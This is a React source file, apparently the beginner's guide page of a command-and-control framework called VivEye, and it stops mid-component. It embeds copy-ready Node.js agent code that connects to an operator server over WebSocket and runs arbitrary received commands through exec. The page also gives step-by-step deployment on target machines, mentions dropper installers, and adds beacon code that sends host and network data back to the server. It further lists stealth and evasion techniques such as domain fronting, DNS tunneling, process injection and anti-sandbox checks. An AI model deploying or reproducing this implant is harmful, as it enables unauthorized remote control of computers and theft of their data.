import React, { useState } from 'react';
import { 
  CheckCircle, 
  Copy, 
  AlertCircle, 
  Terminal, 
  Monitor, 
  Smartphone,
  Shield,
  Zap,
  Users,
  Command,
  Eye,
  Download,
  Play
} from 'lucide-react';

const IntroductionGuide = () => {
  const [copiedCode, setCopiedCode] = useState('');

  const copyToClipboard = async (text, label) => {
    try {
      await navigator.clipboard.writeText(text);
      setCopiedCode(label);
      setTimeout(() => setCopiedCode(''), 2000);
    } catch (err) {
      console.error('Failed to copy: ', err);
    }
  };

  const agentCode = `const WebSocket = require('ws');
const { exec } = require('child_process');
const os = require('os');

class VivEyeAgent {
  constructor(serverUrl) {
    this.serverUrl = serverUrl;
    this.ws = null;
    this.agentId = 'agent-' + Math.random().toString(36).substr(2, 9);
  }

  connect() {
    this.ws = new WebSocket(this.serverUrl);
    this.ws.on('open', () => {
      console.log('Connected to VivEye server');
      this.register();
    });
    this.ws.on('message', (data) => {
      const command = JSON.parse(data);
      this.executeCommand(command);
    });
  }

  register() {
    this.ws.send(JSON.stringify({
      type: 'agent-register',
      agentId: this.agentId,
      name: 'VivEye Agent',
      os: os.platform()
    }));
  }

  async executeCommand(command) {
    try {
      const result = await this.runCommand(command.payload);
      this.ws.send(JSON.stringify({
        type: 'command-result',
        commandId: command.id,
        result: result,
        status: 'completed'
      }));
    } catch (error) {
      this.ws.send(JSON.stringify({
        type: 'command-result',
        commandId: command.id,
        result: error.message,
        status: 'failed'
      }));
    }
  }

  runCommand(cmd) {
    return new Promise((resolve, reject) => {
      exec(cmd, (error, stdout, stderr) => {
        if (error) reject(error);
        else resolve(stdout);
      });
    });
  }
}

const agent = new VivEyeAgent('ws://YOUR_IP:8080');
agent.connect();`;

  const card = "bg-dark-800 border border-dark-700 rounded-lg p-6";

  const renderOverview = () => (
    <div className="space-y-6">
      {/* What is VivEye */}
      <div className="card">
        <h2 className="text-xl font-semibold text-white mb-4">🎯 What is VivEye?</h2>
        <div className="space-y-4">
          <p className="text-silver-300">
            VivEye is a Command & Control (C2) framework that allows you to remotely manage and control 
            multiple computers from a central dashboard. Think of it as a remote control for computers.
          </p>
          
          <div className="grid md:grid-cols-2 gap-4">
            <div className="bg-dark-800 p-4 rounded-lg">
              <h3 className="font-medium text-white mb-2">Real-World Scenarios</h3>
              <ul className="text-silver-400 text-sm space-y-1">
                <li>• <strong>Penetration Testing:</strong> Test security of client networks</li>
                <li>• <strong>Red Team Exercises:</strong> Simulate real-world attacks</li>
                <li>• <strong>Incident Response:</strong> Investigate security breaches</li>
                <li>• <strong>Security Research:</strong> Study malware and attack techniques</li>
                <li>• <strong>Educational Training:</strong> Teach cybersecurity concepts</li>
              </ul>
            </div>
            
            <div className="bg-dark-800 p-4 rounded-lg">
              <h3 className="font-medium text-white mb-2">Why Use C2?</h3>
              <ul className="text-silver-400 text-sm space-y-1">
                <li>• <strong>Centralized Control:</strong> Manage multiple systems from one place</li>
                <li>• <strong>Stealth Communication:</strong> Use Tor for anonymous connections</li>
                <li>• <strong>Real-time Execution:</strong> Run commands instantly</li>
                <li>• <strong>Persistent Access:</strong> Maintain control over time</li>
                <li>• <strong>Data Collection:</strong> Gather intelligence automatically</li>
              </ul>
            </div>
          </div>
        </div>
      </div>

      {/* How It Works */}
      <div className="card">
        <h2 className="text-xl font-semibold text-white mb-4">⚙️ How VivEye Works</h2>
        <div className="space-y-4">
          <div className="grid md:grid-cols-3 gap-4">
            <div className="bg-dark-800 p-4 rounded-lg text-center">
              <div className="w-12 h-12 bg-primary-600 rounded-full flex items-center justify-center mx-auto mb-3">
                <Terminal className="h-6 w-6 text-white" />
              </div>
              <h3 className="font-medium text-white mb-2">1. Deploy Agents</h3>
              <p className="text-silver-400 text-sm">Install small programs on target computers that connect back to your server</p>
            </div>
            
            <div className="bg-dark-800 p-4 rounded-lg text-center">
              <div className="w-12 h-12 bg-primary-600 rounded-full flex items-center justify-center mx-auto mb-3">
                <Command className="h-6 w-6 text-white" />
              </div>
              <h3 className="font-medium text-white mb-2">2. Send Commands</h3>
              <p className="text-silver-400 text-sm">Use this dashboard to send commands to any connected agent</p>
            </div>
            
            <div className="bg-dark-800 p-4 rounded-lg text-center">
              <div className="w-12 h-12 bg-primary-600 rounded-full flex items-center justify-center mx-auto mb-3">
                <Eye className="h-6 w-6 text-white" />
              </div>
              <h3 className="font-medium text-white mb-2">3. View Results</h3>
              <p className="text-silver-400 text-sm">See command output and system information in real-time</p>
            </div>
          </div>
        </div>
      </div>
    </div>
  );

  const renderAgents = () => (
    <div className="space-y-6">
      {/* What are Agents */}
      <div className="card">
        <h2 className="text-xl font-semibold text-white mb-4">🤖 Agents - Your Remote Computers</h2>
        <div className="space-y-4">
          <p className="text-silver-300">
            Agents are small programs that run on target computers and connect back to your VivEye server. 
            They allow you to remotely control those computers and execute commands.
          </p>
          
          <div className="bg-dark-800 p-4 rounded-lg">
            <h3 className="font-medium text-white mb-2">What Happens When You Deploy an Agent:</h3>
            <ol className="text-silver-400 text-sm space-y-1 ml-4">
              <li>1. Agent connects to your VivEye server</li>
              <li>2. It appears in your dashboard as "online"</li>
              <li>3. You can send commands to it from this interface</li>
              <li>4. Commands execute on the target computer</li>
              <li>5. Results are sent back and displayed here</li>
            </ol>
          </div>
        </div>
      </div>

      {/* Windows Agent Setup - Detailed */}
      <div className="card">
        <h3 className="text-lg font-semibold text-white mb-4">🚀 Windows Agent Setup (Step-by-Step)</h3>
        
        {/* Method 1: Manual Setup */}
        <div className="space-y-4">
          <div className="bg-dark-800 p-4 rounded-lg">
            <h4 className="font-medium text-white mb-3">Method 1: Manual Setup (For Learning)</h4>
            
            <div className="space-y-3">
              <div className="flex items-start space-x-3">
                <div className="flex-shrink-0 w-6 h-6 bg-primary-600 text-white rounded-full flex items-center justify-center text-xs font-bold">1</div>
                <div>
                  <h5 className="font-medium text-white">Download Node.js</h5>
                  <p className="text-silver-400 text-sm">Go to <a href="https://nodejs.org" target="_blank" rel="noopener noreferrer" className="text-primary-400 hover:text-primary-300">nodejs.org</a></p>
                  <p className="text-silver-400 text-sm">Click "Download Node.js" (LTS version)</p>
                  <p className="text-silver-400 text-sm">Run the installer and click "Next" through all steps</p>
                </div>
              </div>
              
              <div className="flex items-start space-x-3">
                <div className="flex-shrink-0 w-6 h-6 bg-primary-600 text-white rounded-full flex items-center justify-center text-xs font-bold">2</div>
                <div>
                  <h5 className="font-medium text-white">Open Notepad</h5>
                  <p className="text-silver-400 text-sm">Press <code className="bg-dark-700 px-1 rounded">Windows + R</code>, type <code className="bg-dark-700 px-1 rounded">notepad</code>, press Enter</p>
                </div>
              </div>
              
              <div className="flex items-start space-x-3">
                <div className="flex-shrink-0 w-6 h-6 bg-primary-600 text-white rounded-full flex items-center justify-center text-xs font-bold">3</div>
                <div>
                  <h5 className="font-medium text-white">Copy the Agent Code</h5>
                  <p className="text-silver-400 text-sm">Copy the code below and paste it into Notepad:</p>
                  <div className="relative mt-2">
                    <pre className="bg-dark-900 p-3 rounded text-sm text-silver-300 overflow-x-auto">
                      <code>{agentCode}</code>
                    </pre>
                    <button
                      onClick={() => copyToClipboard(agentCode, 'Agent code')}
                      className="absolute top-2 right-2 p-2 bg-dark-700 hover:bg-dark-600 rounded text-silver-400 hover:text-white transition-colors"
                    >
                      {copiedCode === 'Agent code' ? <CheckCircle className="h-4 w-4" /> : <Copy className="h-4 w-4" />}
                    </button>
                  </div>
                </div>
              </div>
              
              <div className="flex items-start space-x-3">
                <div className="flex-shrink-0 w-6 h-6 bg-primary-600 text-white rounded-full flex items-center justify-center text-xs font-bold">4</div>
                <div>
                  <h5 className="font-medium text-white">Save the File</h5>
                  <p className="text-silver-400 text-sm">In Notepad: File → Save As</p>
                  <p className="text-silver-400 text-sm">File name: <code className="bg-dark-700 px-1 rounded">agent.js</code></p>
                  <p className="text-silver-400 text-sm">Save as type: <code className="bg-dark-700 px-1 rounded">All Files (*.*)</code></p>
                  <p className="text-silver-400 text-sm">Save to: <code className="bg-dark-700 px-1 rounded">C:\Users\YourName\Desktop</code></p>
                </div>
              </div>
              
              <div className="flex items-start space-x-3">
                <div className="flex-shrink-0 w-6 h-6 bg-primary-600 text-white rounded-full flex items-center justify-center text-xs font-bold">5</div>
                <div>
                  <h5 className="font-medium text-white">Open Command Prompt</h5>
                  <p className="text-silver-400 text-sm">Press <code className="bg-dark-700 px-1 rounded">Windows + R</code>, type <code className="bg-dark-700 px-1 rounded">cmd</code>, press Enter</p>
                </div>
              </div>
              
              <div className="flex items-start space-x-3">
                <div className="flex-shrink-0 w-6 h-6 bg-primary-600 text-white rounded-full flex items-center justify-center text-xs font-bold">6</div>
                <div>
                  <h5 className="font-medium text-white">Navigate to Desktop</h5>
                  <p className="text-silver-400 text-sm">Type these commands one by one:</p>
                  <div className="bg-dark-900 p-3 rounded mt-2">
                    <code className="text-silver-300">cd Desktop</code>
                    <br />
                    <code className="text-silver-300">dir</code>
                    <br />
                    <code className="text-silver-300">node agent.js</code>
                  </div>
                </div>
              </div>
            </div>
          </div>
        </div>

        {/* Method 2: Pre-made Dropper */}
        <div className="bg-dark-800 p-4 rounded-lg">
          <h4 className="font-medium text-white mb-3">Method 2: Pre-made Dropper (Easiest)</h4>
          <p className="text-silver-400 text-sm mb-3">Download and run our pre-made installer:</p>
          
          <div className="space-y-3">
            <div className="bg-dark-900 p-3 rounded">
              <h5 className="font-medium text-white mb-2">Step 1: Download the Dropper</h5>
              <p className="text-silver-400 text-sm mb-2">Download <code className="bg-dark-700 px-1 rounded">install-windows.bat</code> from the VivEye project</p>
              <p className="text-silver-400 text-sm mb-2">This file is located in the <code className="bg-dark-700 px-1 rounded">droppers/</code> folder</p>
              <div className="flex items-center space-x-2 mt-2">
                <Download className="h-4 w-4 text-primary-400" />
                <span className="text-primary-400 text-sm">Available in: /droppers/install-windows.bat</span>
              </div>
            </div>
            
            <div className="bg-dark-900 p-3 rounded">
              <h5 className="font-medium text-white mb-2">Step 2: Run the Dropper</h5>
              <p className="text-silver-400 text-sm mb-2">Double-click <code className="bg-dark-700 px-1 rounded">install-windows.bat</code></p>
              <p className="text-silver-400 text-sm mb-2">The script will:</p>
              <ul className="text-silver-400 text-sm ml-4 list-disc">
                <li>Check if Node.js is installed</li>
                <li>Create the agent.js file automatically</li>
                <li>Install required dependencies</li>
                <li>Ask for your VivEye server IP address</li>
                <li>Configure everything for you</li>
              </ul>
            </div>
            
            <div className="bg-dark-900 p-3 rounded">
              <h5 className="font-medium text-white mb-2">Step 3: Done!</h5>
              <p className="text-silver-400 text-sm mb-2">The agent will start automatically and appear in your VivEye dashboard</p>
              <p className="text-silver-400 text-sm mb-2">If you chose not to run it immediately, just run <code className="bg-dark-700 px-1 rounded">node agent.js</code> later</p>
            </div>
          </div>
        </div>
      </div>

      {/* Linux/macOS Agent Setup */}
      <div className="card">
        <h3 className="text-lg font-semibold text-white mb-4">🐧 Linux/macOS Agent Setup</h3>
        
        <div className="space-y-4">
          <div className="bg-dark-800 p-4 rounded-lg">
            <h4 className="font-medium text-white mb-3">Method 1: Manual Setup</h4>
            
            <div className="space-y-3">
              <div className="flex items-start space-x-3">
                <div className="flex-shrink-0 w-6 h-6 bg-primary-600 text-white rounded-full flex items-center justify-center text-xs font-bold">1</div>
                <div>
                  <h5 className="font-medium text-white">Install Node.js</h5>
                  <p className="text-silver-400 text-sm">Ubuntu/Debian: <code className="bg-dark-700 px-1 rounded">sudo apt install nodejs npm</code></p>
                  <p className="text-silver-400 text-sm">macOS: <code className="bg-dark-700 px-1 rounded">brew install node</code></p>
                  <p className="text-silver-400 text-sm">Or download from <a href="https://nodejs.org" target="_blank" rel="noopener noreferrer" className="text-primary-400 hover:text-primary-300">nodejs.org</a></p>
                </div>
              </div>
              
              <div className="flex items-start space-x-3">
                <div className="flex-shrink-0 w-6 h-6 bg-primary-600 text-white rounded-full flex items-center justify-center text-xs font-bold">2</div>
                <div>
                  <h5 className="font-medium text-white">Open Terminal</h5>
                  <p className="text-silver-400 text-sm">Press <code className="bg-dark-700 px-1 rounded">Ctrl + Alt + T</code> (Linux) or <code className="bg-dark-700 px-1 rounded">Cmd + Space</code> then "Terminal" (macOS)</p>
                </div>
              </div>
              
              <div className="flex items-start space-x-3">
                <div className="flex-shrink-0 w-6 h-6 bg-primary-600 text-white rounded-full flex items-center justify-center text-xs font-bold">3</div>
                <div>
                  <h5 className="font-medium text-white">Create Agent File</h5>
                  <p className="text-silver-400 text-sm">Type: <code className="bg-dark-700 px-1 rounded">nano agent.js</code></p>
                  <p className="text-silver-400 text-sm">Copy and paste the agent code above</p>
                  <p className="text-silver-400 text-sm">Press <code className="bg-dark-700 px-1 rounded">Ctrl + X</code>, then <code className="bg-dark-700 px-1 rounded">Y</code>, then <code className="bg-dark-700 px-1 rounded">Enter</code></p>
                </div>
              </div>
              
              <div className="flex items-start space-x-3">
                <div className="flex-shrink-0 w-6 h-6 bg-primary-600 text-white rounded-full flex items-center justify-center text-xs font-bold">4</div>
                <div>
                  <h5 className="font-medium text-white">Run the Agent</h5>
                  <p className="text-silver-400 text-sm">Type: <code className="bg-dark-700 px-1 rounded">node agent.js</code></p>
                </div>
              </div>
            </div>
          </div>

          <div className="bg-dark-800 p-4 rounded-lg">
            <h4 className="font-medium text-white mb-3">Method 2: Pre-made Dropper (Easiest)</h4>
            <p className="text-silver-400 text-sm mb-3">Download and run our pre-made installer:</p>
            
            <div className="space-y-3">
              <div className="bg-dark-900 p-3 rounded">
                <h5 className="font-medium text-white mb-2">Step 1: Download the Dropper</h5>
                <p className="text-silver-400 text-sm mb-2">Download <code className="bg-dark-700 px-1 rounded">install-linux.sh</code> from the VivEye project</p>
                <p className="text-silver-400 text-sm mb-2">This file is located in the <code className="bg-dark-700 px-1 rounded">droppers/</code> folder</p>
                <div className="flex items-center space-x-2 mt-2">
                  <Download className="h-4 w-4 text-primary-400" />
                  <span className="text-primary-400 text-sm">Available in: /droppers/install-linux.sh</span>
                </div>
              </div>
              
              <div className="bg-dark-900 p-3 rounded">
                <h5 className="font-medium text-white mb-2">Step 2: Make it Executable</h5>
                <p className="text-silver-400 text-sm mb-2">Type: <code className="bg-dark-700 px-1 rounded">chmod +x install-linux.sh</code></p>
              </div>
              
              <div className="bg-dark-900 p-3 rounded">
                <h5 className="font-medium text-white mb-2">Step 3: Run the Dropper</h5>
                <p className="text-silver-400 text-sm mb-2">Type: <code className="bg-dark-700 px-1 rounded">./install-linux.sh</code></p>
                <p className="text-silver-400 text-sm mb-2">The script will:</p>
                <ul className="text-silver-400 text-sm ml-4 list-disc">
                  <li>Check if Node.js is installed</li>
                  <li>Create the agent.js file automatically</li>
                  <li>Install required dependencies</li>
                  <li>Ask for your VivEye server IP address</li>
                  <li>Configure everything for you</li>
                </ul>
              </div>
              
              <div className="bg-dark-900 p-3 rounded">
                <h5 className="font-medium text-white mb-2">Step 4: Done!</h5>
                <p className="text-silver-400 text-sm mb-2">The agent will start automatically and appear in your VivEye dashboard</p>
                <p className="text-silver-400 text-sm mb-2">If you chose not to run it immediately, just run <code className="bg-dark-700 px-1 rounded">node agent.js</code> later</p>
              </div>
            </div>
          </div>
        </div>
      </div>

      {/* What Happens Next */}
      <div className="card bg-green-900/20 border-green-700">
        <h3 className="text-lg font-semibold text-white mb-4">✅ What Happens Next?</h3>
        <div className="space-y-3">
          <div className="flex items-start space-x-3">
            <CheckCircle className="h-5 w-5 text-green-400 mt-0.5" />
            <div>
              <h4 className="font-medium text-white">Agent Appears in Dashboard</h4>
              <p className="text-silver-400 text-sm">You'll see the new agent in your VivEye dashboard with a green "online" status</p>
            </div>
          </div>
          <div className="flex items-start space-x-3">
            <CheckCircle className="h-5 w-5 text-green-400 mt-0.5" />
            <div>
              <h4 className="font-medium text-white">Ready for Commands</h4>
              <p className="text-silver-400 text-sm">You can now send commands to that computer from your VivEye interface</p>
            </div>
          </div>
          <div className="flex items-start space-x-3">
            <CheckCircle className="h-5 w-5 text-green-400 mt-0.5" />
            <div>
              <h4 className="font-medium text-white">Real-time Results</h4>
              <p className="text-silver-400 text-sm">Command results appear instantly in your dashboard</p>
            </div>
          </div>
        </div>
      </div>
    </div>
  );

  const renderBeacons = () => (
    <div className="space-y-6">
      <div className="card">
        <h2 className="text-xl font-semibold text-white mb-4">📡 Beacons - Advanced Communication</h2>
        <div className="space-y-4">
          <div className="bg-yellow-900/20 border-yellow-700 p-4 rounded-lg">
            <div className="flex items-start space-x-3">
              <AlertCircle className="h-5 w-5 text-yellow-400 mt-0.5" />
              <div>
                <h3 className="font-medium text-white mb-1">Beginner Note</h3>
                <p className="text-silver-400 text-sm">
                  <strong>For beginners:</strong> You can skip beacons for now. They're an advanced feature for 
                  more sophisticated communication patterns. Start with agents - they're easier to understand and use.
                </p>
              </div>
            </div>
          </div>

          <p className="text-silver-300">
            Beacons are advanced communication mechanisms that allow agents to maintain persistent, 
            stealthy connections with your VivEye server. They're like a "heartbeat" system that 
            keeps agents connected even when you're not actively sending commands.
          </p>
          
          <div className="grid md:grid-cols-2 gap-4">
            <div className="bg-dark-800 p-4 rounded-lg">
              <h3 className="font-medium text-white mb-2">What are Beacons?</h3>
              <ul className="text-silver-400 text-sm space-y-1">
                <li>• <strong>Heartbeat Messages:</strong> Agents check in periodically</li>
                <li>• <strong>Stealth Communication:</strong> Minimal network footprint</li>
                <li>• <strong>Persistent Connection:</strong> Maintains contact over time</li>
                <li>• <strong>Health Monitoring:</strong> Know if agents are still alive</li>
                <li>• <strong>Evasion Techniques:</strong> Avoid detection by security tools</li>
              </ul>
            </div>
            
            <div className="bg-dark-800 p-4 rounded-lg">
              <h3 className="font-medium text-white mb-2">When to Use Beacons</h3>
              <ul className="text-silver-400 text-sm space-y-1">
                <li>• <strong>Long-term Operations:</strong> Multi-day penetration tests</li>
                <li>• <strong>Stealth Missions:</strong> Avoid constant communication</li>
                <li>• <strong>Firewall Evasion:</strong> Bypass network restrictions</li>
                <li>• <strong>Persistence:</strong> Maintain access over time</li>
                <li>• <strong>Advanced C2:</strong> Professional red team operations</li>
              </ul>
            </div>
          </div>

          <div className="bg-dark-800 p-4 rounded-lg">
            <h3 className="font-medium text-white mb-3">How Beacons Work</h3>
            <div className="space-y-3">
              <div className="flex items-start space-x-3">
                <div className="flex-shrink-0 w-6 h-6 bg-primary-600 text-white rounded-full flex items-center justify-center text-xs font-bold">1</div>
                <div>
                  <h4 className="font-medium text-white">Agent Registers</h4>
                  <p className="text-silver-400 text-sm">Agent connects to VivEye server and registers its beacon capability</p>
                </div>
              </div>
              
              <div className="flex items-start space-x-3">
                <div className="flex-shrink-0 w-6 h-6 bg-primary-600 text-white rounded-full flex items-center justify-center text-xs font-bold">2</div>
                <div>
                  <h4 className="font-medium text-white">Periodic Check-ins</h4>
                  <p className="text-silver-400 text-sm">Agent sends beacon messages every few minutes (configurable)</p>
                </div>
              </div>
              
              <div className="flex items-start space-x-3">
                <div className="flex-shrink-0 w-6 h-6 bg-primary-600 text-white rounded-full flex items-center justify-center text-xs font-bold">3</div>
                <div>
                  <h4 className="font-medium text-white">Status Updates</h4>
                  <p className="text-silver-400 text-sm">Each beacon includes system status, network info, and health data</p>
                </div>
              </div>
              
              <div className="flex items-start space-x-3">
                <div className="flex-shrink-0 w-6 h-6 bg-primary-600 text-white rounded-full flex items-center justify-center text-xs font-bold">4</div>
                <div>
                  <h4 className="font-medium text-white">Command Queue</h4>
                  <p className="text-silver-400 text-sm">Server can queue commands for the next beacon check-in</p>
                </div>
              </div>
            </div>
          </div>

          <div className="bg-dark-800 p-4 rounded-lg">
            <h3 className="font-medium text-white mb-3">Beacon Configuration</h3>
            <div className="space-y-3">
              <div className="bg-dark-900 p-3 rounded">
                <h4 className="font-medium text-white mb-2">Interval Settings</h4>
                <ul className="text-silver-400 text-sm space-y-1">
                  <li>• <strong>Fast:</strong> 30 seconds - High activity operations</li>
                  <li>• <strong>Normal:</strong> 2-5 minutes - Standard operations</li>
                  <li>• <strong>Slow:</strong> 15-30 minutes - Stealth operations</li>
                  <li>• <strong>Random:</strong> Variable timing - Evasion techniques</li>
                </ul>
              </div>
              
              <div className="bg-dark-900 p-3 rounded">
                <h4 className="font-medium text-white mb-2">Data Collection</h4>
                <ul className="text-silver-400 text-sm space-y-1">
                  <li>• System information (OS, version, architecture)</li>
                  <li>• Network configuration (IP, DNS, routes)</li>
                  <li>• Running processes and services</li>
                  <li>• User activity and login sessions</li>
                  <li>• File system changes and modifications</li>
                </ul>
              </div>
            </div>
          </div>

          <div className="bg-dark-800 p-4 rounded-lg">
            <h3 className="font-medium text-white mb-3">Advanced Features</h3>
            <div className="grid md:grid-cols-2 gap-4">
              <div className="bg-dark-900 p-3 rounded">
                <h4 className="font-medium text-white mb-2">Stealth Techniques</h4>
                <ul className="text-silver-400 text-sm space-y-1">
                  <li>• <strong>Domain Fronting:</strong> Hide behind legitimate domains</li>
                  <li>• <strong>DNS Tunneling:</strong> Use DNS queries for communication</li>
                  <li>• <strong>HTTPS Tunneling:</strong> Encrypt all communications</li>
                  <li>• <strong>Jitter:</strong> Randomize timing to avoid detection</li>
                </ul>
              </div>
              
              <div className="bg-dark-900 p-3 rounded">
                <h4 className="font-medium text-white mb-2">Evasion Methods</h4>
                <ul className="text-silver-400 text-sm space-y-1">
                  <li>• <strong>Process Injection:</strong> Hide in legitimate processes</li>
                  <li>• <strong>Memory-only:</strong> No files on disk</li>
                  <li>• <strong>Persistence:</strong> Survive reboots and updates</li>
                  <li>• <strong>Anti-analysis:</strong> Detect and avoid sandboxes</li>
                </ul>
              </div>
            </div>
          </div>

          <div className="bg-dark-800 p-4 rounded-lg">
            <h3 className="font-medium text-white mb-3">Real-World Scenarios</h3>
            <div className="space-y-3">
              <div className="bg-dark-900 p-3 rounded">
                <h4 className="font-medium text-white mb-1">Red Team Exercise</h4>
                <p className="text-silver-400 text-sm mb-2">"I need to maintain persistent access to the target network for 30 days"</p>
                <p className="text-silver-400 text-sm">Use beacons with 5-minute intervals and stealth techniques to avoid detection</p>
              </div>
              
              <div className="bg-dark-900 p-3 rounded">
                <h4 className="font-medium text-white mb-1">Incident Response</h4>
                <p className="text-silver-400 text-sm mb-2">"I need to monitor a compromised system without alerting the attacker"</p>
                <p className="text-silver-400 text-sm">Deploy beacons to gather intelligence while maintaining stealth</p>
              </div>
              
              <div className="bg-dark-900 p-3 rounded">
                <h4 className="font-medium text-white mb-1">Security Research</h4>
                <p className="text-silver-400 text-sm mb-2">"I want to study how malware maintains persistence in enterprise environments"</p>
                <p className="text-silver-400 text-sm">Use beacons to simulate advanced persistent threats (APTs)</p>
              </div>
            </div>
          </div>

          <div className="bg-blue-900/20 border-blue-700 p-4 rounded-lg">
            <div className="flex items-start space-x-3">
              <Shield className="h-5 w-5 text-blue-400 mt-0.5" />
              <div>
                <h3 className="font-medium text-white mb-1">Professional Use</h3>
                <p className="text-silver-400 text-sm">
                  Beacons are essential for professional penetration testing and red team operations. 
                  They provide the persistence and stealth needed for realistic attack simulations.
                </p>
              </div>
            </div>
          </div>

          <div className="bg-dark-800 p-4 rounded-lg">
            <h3 className="font-medium text-white mb-3">Beacon Code Example</h3>
            <p className="text-silver-400 text-sm mb-3">
              Here's how to add beacon functionality to your agent:
            </p>
            <div className="relative">
              <pre className="bg-dark-900 p-4 rounded text-sm text-silver-300 overflow-x-auto">
                <code>{`// Add to your agent.js file
class VivEyeAgent {
  constructor(serverUrl) {
    this.serverUrl = serverUrl;
    this.ws = null;
    this.agentId = 'agent-' + Math.random().toString(36).substr(2, 9);
    this.beaconInterval = 300000; // 5 minutes
    this.beaconTimer = null;
  }

  // ... existing methods ...

  startBeacon() {
    this.beaconTimer = setInterval(() => {
      this.sendBeacon();
    }, this.beaconInterval);
  }

  sendBeacon() {
    if (this.ws && this.ws.readyState === WebSocket.OPEN) {
      const beaconData = {
        type: 'beacon',
        agentId: this.agentId,
        timestamp: new Date().toISOString(),
        systemInfo: {
          platform: os.platform(),
          arch: os.arch(),
          uptime: os.uptime(),
          memory: process.memoryUsage(),
          cpu: process.cpuUsage()
        },
        networkInfo: {
          hostname: os.hostname(),
          interfaces: os.networkInterfaces()
        }
      };
      
      this.ws.send(JSON.stringify(beaconData));
      console.log('Beacon sent:', new Date().toISOString());
    }
  }

  stopBeacon() {
    if (this.beaconTimer) {
      clearInterval(this.beaconTimer);
      this.beaconTimer = null;
    }
  }
}

// Start beacon after connecting
agent.connect();
agent.startBeacon();`}</code>
              </pre>
              <button
                onClick={() => copyToClipboard(`// Add to your agent.js file
class VivEyeAgent {
  constructor(serverUrl) {
    this.serverUrl = serverUrl;
    this.ws = null;
    this.agentId = 'agent-' + Math.random().toString(36).substr(2, 9);
    this.beaconInterval = 300000; // 5 minutes
    this.beaconTimer = null;
  }

  // ... existing methods ...

  startBeacon() {
    this.beaconTimer = setInterval(() => {
      this.sendBeacon();
    }, this.beaconInterval);
  }

  sendBeacon() {
    if (this.ws && this.ws.readyState === WebSocket.OPEN) {
      const beaconData = {
        type: 'beacon',
        agentId: this.agentId,
        timestamp: new Date().toISOString(),
        systemInfo: {
          platform: os.platform(),
          arch: os.arch(),
          uptime: os.uptime(),
          memory: process.memoryUsage(),
          cpu: process.cpuUsage()
        },
        networkInfo: {
          hostname: os.hostname(),
          interfaces: os.networkInterfaces()
        }
      };
      
      this.ws.send(JSON.stringify(beaconData));
      console.log('Beacon sent:', new Date().toISOString());
    }
  }

  stopBeacon() {
    if (this.beaconTimer) {
      clearInterval(this.beaconTimer);
      this.beaconTimer = null;
    }
  }
}

// Start beacon after connecting
agent.connect();
agent.startBeacon();`, 'Beacon code')}
                className="absolute top-2 right-2 p-2 bg-dark-700 hover:bg-dark-600 rounded text-silver-400 hover:text-white transition-colors"
              >
                {copiedCode === 'Beacon code' ? <CheckCircle className="h-4 w-4" /> : <Copy className="h-4 w-4" />}
              </button>
            </div>
            <div className="mt-3 space-y-2">
              <p className="text-silver-400 text-sm">
                <strong>Configuration Options:</strong>
              </p>
              <ul className="text-silver-400 text-sm ml-4 space-y-1">
                <li>• <code className="bg-dark-700 px-1 rounded">beaconInterval</code> - Time between beacons (milliseconds)</li>
                <li>• <code className="bg-dark-700 px-1 rounded">systemInfo</code> - What system data to collect</li>
                <li>• <code className="bg-dark-700 px-1 rounded">networkInfo</code> - Network configuration details</li>
                <li>• <code className="bg-dark-700 px-1 rounded">startBeacon()</code> - Begin beacon transmission</li>
                <li>• <code className="bg-dark-700 px-1 rounded">stopBeacon()</code> - Stop beacon transmission</li>
              </ul>
            </div>
          </div>
        </div>
      </div>
    </div>
  );

  const renderCommands = () => (
    <div className="space-y-6">
      <div className="card">
        <h2 className="text-xl font-semibold text-white mb-4">⚡ Commands - Control Your Agents</h2>
        <div className="space-y-4">
          <p className="text-silver-300">
            Once you have agents connected, you can send commands to them from this dashboard. 
            Commands are executed on the target computer and results are displayed here.
          </p>

          <div className="grid md:grid-cols-2 gap-4">
            <div className="bg-dark-800 p-4 rounded-lg">
              <h3 className="font-medium text-white mb-2">How Commands Work</h3>
              <ol className="text-silver-400 text-sm space-y-1">
                <li>1. Select an agent from the list</li>
                <li>2. Type your command in the input field</li>
                <li>3. Click "Send Command"</li>
                <li>4. View results in real-time</li>
              </ol>
            </div>
            
            <div className="bg-dark-800 p-4 rounded-lg">
              <h3 className="font-medium text-white mb-2">Commands to Try First</h3>
              <ul className="text-silver-400 text-sm space-y-1">
                <li>• <code className="bg-dark-700 px-1 rounded">whoami</code> - Show current user</li>
                <li>• <code className="bg-dark-700 px-1 rounded">dir</code> - List files (Windows)</li>
                <li>• <code className="bg-dark-700 px-1 rounded">ls</code> - List files (Linux/macOS)</li>
                <li>• <code className="bg-dark-700 px-1 rounded">ipconfig</code> - Network info (Windows)</li>
                <li>• <code className="bg-dark-700 px-1 rounded">ifconfig</code> - Network info (Linux/macOS)</li>
              </ul>
            </div>
          </div>

          <div className="bg-dark-800 p-4 rounded-lg">
            <h3 className="font-medium text-white mb-2">Command Status</h3>
            <div className="grid md:grid-cols-3 gap-4">
              <div className="text-center">
                <div className="w-8 h-8 bg-green-600 rounded-full flex items-center justify-center mx-auto mb-2">
                  <CheckCircle className="h-4 w-4 text-white" />
                </div>
                <h4 className="font-medium text-white text-sm">Completed</h4>
                <p className="text-silver-400 text-xs">Command finished successfully</p>
              </div>
              <div className="text-center">
                <div className="w-8 h-8 bg-yellow-600 rounded-full flex items-center justify-center mx-auto mb-2">
                  <Zap className="h-4 w-4 text-white" />
                </div>
                <h4 className="font-medium text-white text-sm">Running</h4>
                <p className="text-silver-400 text-xs">Command is executing</p>
              </div>
              <div className="text-center">
                <div className="w-8 h-8 bg-red-600 rounded-full flex items-center justify-center mx-auto mb-2">
                  <AlertCircle className="h-4 w-4 text-white" />
                </div>
                <h4 className="font-medium text-white text-sm">Failed</h4>
                <p className="text-silver-400 text-xs">Command encountered an error</p>
              </div>
            </div>
          </div>

          <div className="bg-dark-800 p-4 rounded-lg">
            <h3 className="font-medium text-white mb-2">Pro Tips</h3>
            <ul className="text-silver-400 text-sm space-y-1">
              <li>• Use <code className="bg-dark-700 px-1 rounded">dir /s</code> to list all files recursively (Windows)</li>
              <li>• Use <code className="bg-dark-700 px-1 rounded">ls -la</code> to see hidden files (Linux/macOS)</li>
              <li>• Use <code className="bg-dark-700 px-1 rounded">netstat -an</code> to see network connections</li>
              <li>• Use <code className="bg-dark-700 px-1 rounded">tasklist</code> to see running processes (Windows)</li>
              <li>• Use <code className="bg-dark-700 px-1 rounded">ps aux</code> to see running processes (Linux/macOS)</li>
            </ul>
          </div>
        </div>
      </div>
    </div>
  );

  const renderQuickStart = () => (
    <div className="space-y-6">
      <div className="card bg-green-900/20 border-green-700">
